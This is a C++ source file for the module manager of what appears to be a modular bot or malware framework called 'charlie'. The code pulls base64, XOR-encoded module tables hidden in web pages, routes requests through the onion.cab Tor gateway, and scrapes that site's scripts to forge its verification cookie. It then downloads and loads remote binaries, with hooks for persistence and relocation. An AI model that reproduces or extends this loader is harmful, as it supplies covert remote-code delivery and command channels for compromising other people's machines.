//xxx: Later maybe this can be automated?
#define MODULE_ID 3133916783
#include <modules/manager/Manager.h>
#include <boost/thread.hpp>
#include <boost/regex.hpp>
#include <stdexcept>
#include <algorithm>
#include <openssl/md5.h>
#include <charlie/base64.h>
#include <vector>
#include <charlie/xor.h>
#include <charlie/CryptoBuf.h>
#include <chrono>

#include <boost/algorithm/string/predicate.hpp>

//#undef VERBOSE
#define VERBOSE
#include <charlie/curl.h>

using namespace modules::manager;

ManagerModule::ManagerModule()
{
  MLOG("Manager module constructed...");
  pInter = new ManagerInter(this);
  nextModuleUpdate = std::time(NULL);
  dependedUpon = NULL;
  clientMod = NULL;
  aboutToRelocate = false;
}

ManagerModule::~ManagerModule()
{
  delete pInter;
}

void ManagerModule::shutdown()
{
  MLOG("Shutting down manager module..");
  loadedModules.clear();
}

void ManagerModule::setModuleInterface(ModuleInterface* inter)
{
  MLOG("Received module interface");
  mInter = inter;
}

void ManagerModule::injectDependency(u32 id, void* dep)
{
  if(!dep) return;

  MLOG("Dep injected "<<id);
  switch(id)
  {
    case (u32)2526948902:
      persist = (modules::persist::PersistInter*)dep;
      break;
    case (u32)CLIENT_MODULE_ID:
      clientMod = (modules::client::ClientInter*) dep;
      break;
    case 163025:
      torModule = dep;
      break;
  }
  loadedModules[id] = (ModuleAPI*)dep;
}

void ManagerModule::releaseDependency(u32 id)
{
  MLOG("Dep released "<<id);
  switch(id)
  {
    case (u32)2526948902:
      persist = NULL;
      break;
    case (u32)CLIENT_MODULE_ID:
      clientMod = NULL;
      break;
    case 163025:
      torModule = NULL;
      break;
  }
  loadedModules.erase(id);
}

std::string ManagerModule::fetchOcUrl(const std::string& url)
{
  bool hasRehashed = false;
  CURLcode ccode;
  MLOG("Fetching from onioncab " << url);

  /*
   * Send the request, if we get a tttt= rehash
   * If we have already rehashed and get ttt= again exit
   */
  while(true)
  {
    if(onionCabHash.empty() && stor.has_onion_cab_cookie())
    {
      onionCabHash = std::string(stor.onion_cab_cookie());
      MLOG("Loaded onion.cab cookie from storage: "<<onionCabHash);
    }

    struct curl_slist *headers=NULL;

    std::string cookie;
    std::string cookiehdr;
    if(!onionCabHash.empty())
    {
      cookie = std::string("onion_cab_iKnowShit=")+onionCabHash+";";
#ifdef VERBOSE
      MLOG("Using header: Cookie: "<<cookie);
#endif
      cookiehdr = std::string("Cookie: ")+cookie;
      headers = curl_slist_append(headers, cookiehdr.c_str());
    }
#ifdef VERBOSE
    else
    {
      MLOG("Will fetch onion.cab cookies.");
    }
#endif

    headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
    headers = curl_slist_append(headers, "Accept-Encoding: identity");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.8,ru;q=0.6");
    headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36");
    headers = curl_slist_append(headers, "Connection: close");

#ifdef VERBOSE
    MLOG("Fetching "<<url);
#endif

    std::ostringstream oss;
    std::string s;

    if(CURLE_OK == (ccode = curl_read(url.c_str(), oss, NULL, headers)))
      s = oss.str();
    else
    {
      curl_slist_free_all(headers);
      throw std::runtime_error(std::string("curle_not_ok: ")+curl_easy_strerror(ccode));
    }
    oss.str(std::string());
    oss.clear();

    curl_slist_free_all(headers);

#ifdef VERBOSE
    MLOG("Onion.cab response: "<<s);
#endif

    if(s.find("loadAgreement()")!=std::string::npos)
    {
      if(hasRehashed)
      {
        MERR("Onion cab still not accepting our verification hash.");
        throw std::runtime_error("onion_cab");
      }

      hasRehashed = true;
      boost::match_results<std::string::iterator> results;

      //Find the  value
      boost::regex t5r("(var ttttt=)('.*?')");
      boost::regex tk3r("(\"tktktk\\|atob\\|)([a-zA-Z0-9]*)(\".split\\(\"\\|\"\\))");
      if (boost::regex_search(s.begin(), s.end(), results, t5r))
      {
        std::string t5(results[2]);
        t5 = t5.substr(1, t5.length()-2);
#ifdef VERBOSE
        MLOG("t5 value: "<<t5);
#endif

        // Fetch tk3 value
        // Probably better to not hardcode this url
        std::string jqs;
        if(CURLE_OK == (ccode = curl_read("https://onion.cab/js/jQuery.js", oss)))
          jqs = oss.str();
        else
          throw std::runtime_error(std::string("curle_not_ok: ")+curl_easy_strerror(ccode));

        oss.str(std::string());
        oss.clear();

        //Find tk3
        if (boost::regex_search(jqs.begin(), jqs.end(), results, tk3r))
        {
          std::string tk3(results[2]);
          //base 64 decode
          {
            unsigned char* b64d;
            size_t b64dl = (size_t)base64Decode(tk3.c_str(), tk3.length(), &b64d);
            tk3 = std::string((const char*)b64d, b64dl);
            free(b64d);
          }

#ifdef VERBOSE
          MLOG("tk3 value: "<<tk3);
#endif
          //Now we have to md5...
          char mdString[33];
          {
            std::string tksum = tk3+t5;
            unsigned char digest[MD5_DIGEST_LENGTH];
            MD5((const unsigned char*)tksum.c_str(), tksum.length(), (unsigned char*)&digest);
            for (int i = 0; i < 16; i++)
              sprintf(&mdString[i*2], "%02x", (unsigned int)digest[i]);
          }
#ifdef VERBOSE
          MLOG("Final onionCab iKnowShit is "<<mdString);
#endif
          onionCabHash = std::string(mdString, 33);
          stor.set_onion_cab_cookie(onionCabHash);
          saveStorage();

          continue;
        }else
        {
          MERR("Onion cab: unable to find tk3 in jQuery");
          throw std::runtime_error("no_tk3");
        }
      }
      else{
#ifdef VERBOSE
        MERR("Onion cab: unable to find t5 in agreement script!");
#endif
        throw std::runtime_error("no_t5");
      }
    }

    return s;
  }
}

std::string ManagerModule::fetchStaticUrl(const std::string& url)
{
  std::ostringstream oss;
  std::string s;
  CURLcode ccode;

  if(CURLE_OK == (ccode = curl_read(url.c_str(), oss)))
    s = oss.str();
  else
    throw std::runtime_error(std::string("curle_not_ok")+curl_easy_strerror(ccode));

  return s;
}

std::string ManagerModule::fetchUrl(std::string url)
{
  if (url.find("onion:") == 0) {
    url = url.substr(6);
    int slashPos = url.find("/");
    if (slashPos != std::string::npos)
    {
      url = url.substr(0, slashPos) + ".onion.cab" + url.substr(slashPos);
    }
    url = "https://" + url;
    MLOG("Rewrote onion url to " << url);
  }
  if (url.find("http") != 0)
    url = std::string("http://") + url;
  if(url.find("onion.cab") != std::string::npos)
    return fetchOcUrl(url);
  return fetchStaticUrl(url);
}

void ManagerModule::saveStorage()
{
  std::string data;
  if(!stor.SerializeToString(&data))
  {
    MERR("Unable to serialize storage to string!");
    return;
  }
  mInter->saveStorage(data);
}

//Base64
//^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$

charlie::CModuleTable* ManagerModule::fetchStaticModTable(charlie::CSignedBuffer** lmb)
{
  MLOG("Fetching initial module tables from all sources...");
  boost::regex re("@[a-zA-Z0-9+/]+={0,2}");
  boost::match_results<std::string::const_iterator> results;
  charlie::CModuleTable* latest = 0;
  for(auto str : sInfo.init_url())
  {
    try {
      MLOG("Trying to fetch table from "<<str<<"...");
      const std::string s = fetchUrl(str);

#ifdef VERBOSE
      MLOG("Body: "<<s);
#endif

      boost::sregex_token_iterator iter(s.begin(), s.end(), re, 0);
      boost::sregex_token_iterator end;
      bool foundOne = false;
      for(; iter != end; ++iter)
      {
        foundOne = true;
        std::string b64 = std::string(*iter).substr(1);
#ifdef VERBOSE
        MLOG("Found an encoded module table: "<<b64);
#endif
        //Decode base64
        unsigned char* b64d;
        int b64len;
        try {
          b64len = base64Decode(b64.c_str(), b64.length(), &b64d);
          apply_xor(b64d, b64len, ONLINE_MTABLE_KEY, strlen(ONLINE_MTABLE_KEY));
        }catch(const std::exception &exc)
        {
          MERR("Error occurred decoding base 64.");
#ifdef VERBOSE
          MERR(exc.what());
#endif
        }
#ifdef DEBUG
#ifdef VERBOSE
        {
          char mdString[33];
          unsigned char digest[MD5_DIGEST_LENGTH];
          MD5((const unsigned char*)b64d, b64len, (unsigned char*)&digest);
          for (int i = 0; i < 16; i++)
            sprintf(&mdString[i*2], "%02x", (unsigned int)digest[i]);
          MLOG("MD5 of data: "<<mdString);
          MLOG("Length of data: "<<b64len);
        }
#endif
#endif
        //Decrypt CSignedBuffer
        charlie::CSignedBuffer buf;
        if(buf.ParseFromArray(b64d, b64len))
        {
          //Verify signature
          if(verifySignedBuf(&buf, crypt) == 0)
          {
            charlie::CWebInformation winfo;
            if(winfo.ParseFromArray(buf.data().c_str(), buf.data().length()))
            {
              MLOG("Web information timestamp "<<winfo.timestamp()<<" verified.");

              //Verify second layer, another csignedbuffer
              if(winfo.has_mod_table()){
                charlie::CSignedBuffer mbuf = winfo.mod_table();
                charlie::CModuleTable mod_table;
                if(verifySignedBuf(&mbuf, crypt) == 0 && mod_table.ParseFromString(winfo.mod_table().data()))
                {
                  auto time = mod_table.timestamp();
                  MLOG("Discovered mtable with timestamp: "<<time);
                  if(latest==0 || latest->timestamp() < time)
                  {
                    charlie::CModuleTable* table = new charlie::CModuleTable();
                    table->CheckTypeAndMergeFrom(mod_table);
                    //MLOG("Latest discovered timestamp is now: "<<time);
                    delete latest;
                    latest = table;
                    if(lmb)
                    {
                      if(*lmb) delete *lmb;
                      *lmb = new charlie::CSignedBuffer();
                      (*lmb)->CheckTypeAndMergeFrom(mbuf);
                    }
                  }
                }else
                {
                  MERR("Module table failed to verify or parse.");
                }
              }
            }else
            {
              MERR("Unable to parse CWebInformation...");
            }
          }else
          {
            MERR("Parsed a valid signed buffer, but signature is invalid.");
          }
        }else
        {
          MERR("Data does not parse to a signed buffer.");
        }
      }
      if(!foundOne)
      {
        MLOG("No module tables found at link.");
      }
    }catch(const std::exception &exc)
    {
      MERR("Error occured while fetching from "<<str);
//#ifdef VERBOSE
      MERR(exc.what());
//#endif
    }
  }

  //Delete tables
  if(latest == 0)
  {
    MERR("Couldn't find any signed module tables online.");
    return 0;
  }

  MLOG("Latest static online module table is "<<latest->timestamp());
  return latest;
}

int ManagerModule::parseModuleInfo()
{
  std::string info = mInter->getModuleInfo();
  return sInfo.ParseFromString(info) == 0;
}

void ManagerModule::loadStorage()
{
  std::string* data = mInter->getStorage();
  if(data != NULL) stor.ParseFromString(*data);
}

int ManagerModule::updateTableFromInternet(charlie::CModuleTable **wtbl)
{
  charlie::CSignedBuffer* webtblb = 0;
  charlie::CModuleTable* webtbl = fetchStaticModTable(&webtblb);
  if(webtbl != 0)
  {
    int status = 0;
    MLOG("Web module table fetched.");
    //Parse existing table
    charlie::CSignedBuffer* etab = mInter->getModuleTable();
    charlie::CModuleTable emtab;
    bool repExist = false;
    if(!emtab.ParseFromString(etab->data()))
    {
      MERR("Unable to parse existing module table, assuming it's old...");
      repExist = true;
    }
    else
      repExist = emtab.timestamp() < webtbl->timestamp();
    if(repExist)
    {
      MLOG("Attempting to replace existing module table...");
      if(mInter->processModuleTable(webtblb))
      {
        MLOG("New module table successfully loaded and saved.");
        if(wtbl != 0) *wtbl = webtbl;
      }else
      {
        MERR("The new module table couldn't be loaded.");
        status = -1;
      }
    }else
    {
      MLOG("Table is older than current table. Ignoring.");
      status = 1;
    }
    if(wtbl == 0)
      delete webtbl;
    return status;
  }
  return -1;
}

int ManagerModule::fetchModuleFromUrl(const charlie::CModule& mod, std::string url)
{
  // Calculate target filename
  std::string fn(mInter->getModuleFilename((charlie::CModule*)&mod));

  // Download to the file
  std::ofstream of;
  of.open(fn.c_str(), std::ios::out | std::ios::binary | std::ios::trunc);
  CURLcode res(CURLE_FAILED_INIT);
  long status_code;
  if(of.is_open())
  {
    res = curl_read(url, of, &status_code);
    of.close();
  }else
    CERR("Unable to open file "<<fn<<" to download module "<<mod.id()<<"!");

  return status_code != 200l ? status_code : (int)res;
}

void ManagerModule::downloadModules(charlie::CModuleTable* table)
{
  bool anyFailed = false;
  if(aboutToRelocate)
  {
    // Probably will never happen
    MLOG("About to relocate anyway, skipping module download.");
    return;
  }

  if (dependedUpon == NULL)
  {
    MLOG("Deferring downloading modules, we don't have dependency list yet...");
    return;
  }

  boost::mutex::scoped_lock lock(relocateMtx);
  //We need to parse it ourselves
  bool delTab = false;
  if(table == 0)
  {
    charlie::CSignedBuffer* etab = mInter->getModuleTable();
    charlie::CModuleTable* emtab = new charlie::CModuleTable();
    if(!emtab->ParseFromString(etab->data()))
    {
      MERR("Unable to parse the existing module table in downloadModules.");
      return;
    }
    table = emtab;
    delTab = true;
  }

  // Now acquire via acquire methods
  {
    int mcount = table->modules_size();
    std::string reqd;
    for(int i=0;i<mcount;i++)
    {
      const charlie::CModule mod = table->modules(i);

      // Check if we even need this module
      if (dependedUpon->count(mod.id()) == 0)
        continue;

      // Check if the module needs updating
      if(mInter->moduleLoadable(mod.id()))
        continue;

      charlie::CModuleBinary* bin = mInter->selectBinary(table->mutable_modules(i)); if (bin == NULL)
      {
        MLOG("Module "<<mod.id()<<" has no binaries for this platform...");
        continue;
      }

      int acqs = bin->acquire_size();
      MLOG("Module binary "<<mod.id()<<" has "<<acqs<<" acquire methods...");

      // Build a signed download request
      CDownloadRequest req;
      req.set_id(mod.id());
      req.set_platform(CHARLIE_PLATFORM);
      req.SerializeToString(&reqd);
      charlie::CRSABuffer reqs;
      if(encryptRsaBuf(&reqs, this->crypt, (const unsigned char*)reqd.c_str(), reqd.length()) != SUCCESS)
      {
        MERR("Unable to RSA encrypt request for module "<<mod.id()<<"!");
        continue;
      }
      reqs.SerializeToString(&reqd);

      // Serialize to base64
      char* reqb = base64Encode((const unsigned char*)reqd.c_str(), reqd.length());
      std::string reqbs(reqb);
      free(reqb);

      bool loaded = false;
      for(int ia=0;ia<acqs&&!loaded;ia++)
      {
        const charlie::CModuleAcquire acq = bin->acquire(ia);
        switch(acq.type())
        {
          case charlie::HTTP_GET:
          {
            std::string url = acq.data();
            MLOG("Fetching via HTTP: "<<url);
            loaded = (fetchModuleFromUrl(mod, url) == CURLE_OK);
            break;
          }
          case charlie::HTTP_SIGNED:
          {
            std::string url = acq.data()+reqbs;
            MLOG("Fetching via signed HTTP request: "<<url);

            if(boost::starts_with(url, "*"))
            {
              url = url.substr(1);
              for(auto sr : sInfo.server_root())
                if((loaded = (fetchModuleFromUrl(mod, sr+url) == CURLE_OK))) break;
            }else
              loaded = (fetchModuleFromUrl(mod, url) == CURLE_OK);

            if(loaded)
            {
              // Check if module loadable
              MLOG(mod.id()<<" downloaded, verifying...");
              if(!mInter->moduleLoadable(mod.id()))
              {
                MERR("Module "<<mod.id()<<" download wasn't valid.");
                loaded = false;
              }
            }
            break;
          }
          default:
          {
            MERR("Unknown acquire type " << acq.type());
            break;
          }
        }
      }
      if(!loaded)
      {
        MERR("Unable to find a valid acquire for "<<mod.id()<<"!");
        anyFailed = true;
      }
      else
      {MLOG("Successfully downloaded "<<mod.id()<<"!")}
    }

    std::time_t now;
    std::time(&now);
    if (anyFailed)
    {
      MLOG("Some modules failed download, will retry module lookup shortly...");
      nextModuleUpdate = now + 30;
    }
  }

  // Cleanup
  if(delTab) delete table;
  mInter->triggerModuleRecheck();
}

bool running = true;
void ManagerModule::module_main()
{
  //Require persist module
  crypt = mInter->getCrypto();
  mInter->requireDependency(2526948902);
  mInter->requireDependency(CLIENT_MODULE_ID);
  // Tor library
  mInter->requireDependency(163025);
  loadStorage();

  curl_global_init(CURL_GLOBAL_ALL);

  if(parseModuleInfo() != 0)
  {
    MERR("Unable to load module info...");
  }
  while(running)
  {
    try{
      //An interruption point
      boost::this_thread::sleep(boost::posix_time::milliseconds(1000));
    }
    catch(...)
    {
      MLOG("Interrupted, exiting...");
      break;
    }
    std::time_t now;
    std::time(&now);

    if (shouldDownloadModules) {
      downloadModules();
      shouldDownloadModules = false;
    }

    if (pendingLoad != NULL && pendingLoad->size() > 0 && std::difftime(now, nextModuleUpdate) > 0)
    {
      // Quick check to make sure it doens't immediately update again
      nextModuleUpdate = now + 30;
      charlie::CModuleTable* tbl;
      if(updateTableFromInternet(&tbl) != 0)
      {
        MERR("Unable to fetch (a newer?) static module table from the internet, downloading modules anyway...");
        nextModuleUpdate = now + 30;
      }else {
        parseModuleInfo();
        // Try again in 30 minutes since it was successful
        // Later on we will override this if we can't get a network connection
        nextModuleUpdate = now + (60 * 30);
      }
      shouldDownloadModules = true;
    }
  }
  curl_global_cleanup();
}

bool ManagerModule::prepareToRelocate()
{
  boost::mutex::scoped_lock lock(relocateMtx);
  if(aboutToRelocate) return false;
  return aboutToRelocate = true;
}

void* ManagerModule::getPublicInterface()
{
  return (void*)pInter;
}

void ManagerModule::handleEvent(u32 eve, void* data)
{
  charlie::EModuleEvents event = (charlie::EModuleEvents) eve;
  switch (event)
  {
    case charlie::EVENT_UNRESOLVED_MODULES_UPDATE:
      pendingLoad = (std::set<u32>*)data;
      MLOG("Pending load of " << pendingLoad->size() << " modules...");
      break;
    case charlie::EVENT_REQUESTED_MODULES_UPDATE:
      dependedUpon = (std::set<u32>*)data;
      MLOG("Depending upon " << dependedUpon->size() << " modules...");
      shouldDownloadModules = true;
      break;
    default: break;
  }
}

ManagerInter::ManagerInter(ManagerModule* mod)
{
  this->mod = mod;
}

ManagerInter::~ManagerInter()
{
}

bool ManagerInter::prepareToRelocate()
{
  return mod->prepareToRelocate();
}

std::string ManagerInter::fetchUrl(const std::string& url)
{
  return mod->fetchUrl(url);
}

std::string ManagerInter::fetchStaticUrl(const std::string& url)
{
  return mod->fetchStaticUrl(url);
}

std::string ManagerInter::fetchOcUrl(const std::string& url)
{
  return mod->fetchOcUrl(url);
}

CHARLIE_CONSTRUCT(ManagerModule);
